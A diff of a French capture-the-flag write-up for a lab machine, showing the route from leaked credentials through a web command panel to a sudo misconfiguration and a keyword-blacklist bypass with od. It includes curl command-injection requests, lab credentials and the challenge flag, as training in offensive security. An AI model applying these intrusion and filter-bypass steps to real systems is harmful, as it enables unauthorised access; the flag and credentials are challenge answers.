@@ -1,9 +1,15 @@
-# Write-up : "42sh"
+# Write-up : "H4ck3rz"
 
 **Cible :** 10.10.0.30
+
 **Objectif :** Obtenir user.txt
-**Difficulté :** Easy / Medium
+
+**Difficulté :** Easy
+
+**Date :** 16/09/2026
+
 **Techniques utilisées :** Reconnaissance réseau, OSINT/énumération web, brute force de répertoires, contournement de blacklist, escalade de privilèges via sudo
+
 **Outils utilisés :** nmap, curl, gobuster, sshpass, xxd, nc
 
 ---
@@ -42,7 +48,7 @@ Remember username: d4rk_T1t0u4N
 -->
 ```
 
-**Faille exploitée :** Exposition d'informations sensibles dans le code source HTML (CWE-200 : Exposure of Sensitive Information) — un commentaire de développement oublié révèle un identifiant.
+**Faille exploitée :** Exposition d'informations sensibles dans le code source HTML (CWE-200 : Exposure of Sensitive Information) -> un commentaire de développement oublié révèle un identifiant.
 
 ---
 
@@ -54,6 +60,8 @@ Remember username: d4rk_T1t0u4N
 curl -s http://10.10.0.30/robots.txt
 ```
 
+`-s` = Garde la sortie terminal propre (tu vois direct le contenu du fichier sans bruit autour).
+
 **Résultat :**
 
 ```
@@ -61,13 +69,15 @@ User-agent: *
 Disallow: /1337_53CR37_l41r
 ```
 
-**Faille exploitée :** robots.txt mal utilisé comme mécanisme de sécurité (CWE-548 : Exposure of Information Through Directory Listing) — `robots.txt` est une convention pour les moteurs de recherche, pas un contrôle d'accès ; il révèle ici l'existence d'un chemin qu'on n'aurait jamais deviné.
+**Faille exploitée :** robots.txt mal utilisé comme mécanisme de sécurité (CWE-548 : Exposure of Information Through Directory Listing) -> `robots.txt` est une convention que les moteurs de recherche utilisent pour dire aux robots d'indexation (Google, Bing, etc.) quelles parties du site ne pas explorer/indexer, pas un contrôle d'accès ; il révèle ici l'existence d'un chemin qu'on n'aurait jamais deviné.
 
 **Commande :**
 
 ```bash
 curl -i http://10.10.0.30/1337_53CR37_l41r/
 ```
+
+`-i` = Sert à afficher les headers HTTP de la réponse en plus du corps de la page.
 
 **Résultat :** une page révélant le mot de passe associé :
 
@@ -114,7 +124,7 @@ portal.php    (Status: 302) → /login.php
 forbidden.php (Status: 302) → /login.php
 ```
 
-**Faille exploitée :** Pages non référencées mais accessibles ("security by obscurity") (CWE-425 : Direct Access to a Resource) — les fichiers `.php` n'étaient liés depuis aucune page mais restaient accessibles publiquement.
+**Faille exploitée :** Pages non référencées mais accessibles ("security by obscurity") (CWE-425 : Direct Access to a Resource) -> les fichiers `.php` n'étaient liés depuis aucune page mais restaient accessibles publiquement.
 
 ---
 
@@ -126,7 +136,7 @@ forbidden.php (Status: 302) → /login.php
 curl -s http://10.10.0.30/login.php
 ```
 
-→ champs `username`, `password`, bouton `sub`.
+-> champs `username`, `password`, bouton `sub`.
 
 **Connexion :**
 
@@ -136,11 +146,17 @@ curl -s -c cookies.txt -X POST http://10.10.0.30/login.php \
   -i
 ```
 
-**Résultat :** `HTTP/1.1 302 Found` avec redirection vers `/portal.php` → authentification réussie, cookie de session `PHPSESSID` obtenu.
+**Résultat :** `HTTP/1.1 302 Found` avec redirection vers `/portal.php` -> authentification réussie, cookie de session `PHPSESSID` obtenu.
 
 ```bash
 curl -s -c cookies.txt -b cookies.txt http://10.10.0.30/portal.php
 ```
+
+**Résultat :** On tombe sur un commentaire HTML caché en bas de page, encodé en base64.
+
+<!-- YUdGMlpTQjViM1VnYUdWaGNtUWdiMllnWVNCeVlXSmlhWFFnYUc5c1pTQS9JRmx2ZFNCemFHOTFiR1FnYkc5dmF5QnBkQ0IxY0N3Z2VXOTFJR3AxYzNRZ1ptVnNiQ0JwYmlCdmJtVmNJUT09 -->
+
+Une fois décodé = "have you heard of a rabbit hole ? You should look it up, you just fell in one!" -> C'est un indice.
 
 ---
 
@@ -158,7 +174,7 @@ curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
   --data-urlencode "sub=Execute"
 ```
 
-→ résultat : `www-data`
+-> résultat : `www-data`
 
 ---
 
@@ -180,7 +196,7 @@ curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
 drwx------ 1 titouan titouan 4096 Aug 27 09:35 titouan
 ```
 
-→ le répertoire personnel de `titouan` (700, inaccessible à `www-data`) contient probablement `user.txt`.
+-> le répertoire personnel de `titouan` (700, inaccessible à `www-data`) contient probablement `user.txt`.
 
 ---
 
@@ -199,7 +215,7 @@ User www-data may run the following commands on h4xx0r_pc:
     (titouan) NOPASSWD: ALL
 ```
 
-**Faille exploitée :** Règle sudo excessivement permissive (CWE-269 : Improper Privilege Management) — `www-data` peut exécuter n'importe quelle commande en tant que `titouan`, sans mot de passe, ce qui annule toute la protection des permissions du dossier `/home/titouan`.
+**Faille exploitée :** Règle sudo excessivement permissive (CWE-269 : Improper Privilege Management) - `www-data` peut exécuter n'importe quelle commande en tant que `titouan`, sans mot de passe, ce qui annule toute la protection des permissions du dossier `/home/titouan`.
 
 ---
 
@@ -215,7 +231,7 @@ curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
 
 → _"Command contain some forbidden keywords. Disabled to prevent dirty hackers, never too cautious"_ (le mot-clé `cat` est filtré côté serveur)
 
-**Faille exploitée :** Filtrage par liste noire (blacklist) de commandes, contournable (CWE-184 : Incomplete List of Disallowed Inputs) — bloquer `cat` sans bloquer les dizaines d'alternatives permettant de lire un fichier est une protection illusoire.
+**Faille exploitée :** Filtrage par liste noire (blacklist) de commandes, contournable (CWE-184 : Incomplete List of Disallowed Inputs) - bloquer `cat` sans bloquer les dizaines d'alternatives permettant de lire un fichier est une protection illusoire.
 
 **Contournement avec `od` (non filtré) :**
 
@@ -262,22 +278,22 @@ Commentaire HTML caché
 Username trouvé (d4rk_T1t0u4N)
         │
         ▼
-robots.txt → chemin caché /1337_53CR37_l41r/
+robots.txt -> chemin caché /1337_53CR37_l41r/
         │
         ▼
 Password trouvé (8ES7_SHeLL_Ev4H)
         │
         ▼
-Brute-force de répertoires (gobuster) → login.php / portal.php
+Brute-force de répertoires (gobuster) -> login.php / portal.php
         │
         ▼
 Authentification sur le formulaire web (PAS SSH)
         │
         ▼
-Accès au "Shell Panel" → RCE en tant que www-data
+Accès au "Shell Panel" -> RCE en tant que www-data
         │
         ▼
-sudo -l → (titouan) NOPASSWD: ALL
+sudo -l -> (titouan) NOPASSWD: ALL
         │
         ▼
 Contournement du filtre "cat" avec "od -c"
@@ -294,3 +310,15 @@ Lecture de /home/titouan/user.txt → FLAG
 - **Accès applicatif :** authentification sur `login.php` → accès au Shell Panel → RCE en tant que `www-data`.
 - **Escalade de privilèges :** règle sudo `NOPASSWD: ALL` vers `titouan`, contournement du filtre de mots-clés avec `od`.
 - **Flag user :** `EPI{71me_70_D0_7H05E_NcuR5e2}` obtenu dans `/home/titouan/user.txt`.
+
+---
+
+## Evidences
+
+### Brute force
+
+![Brute force](Evidences/Brute%20force%20H4ck3rz.png)
+
+### Flag
+
+![Flag](Evidences/Flag%20H4ck3rz.png)
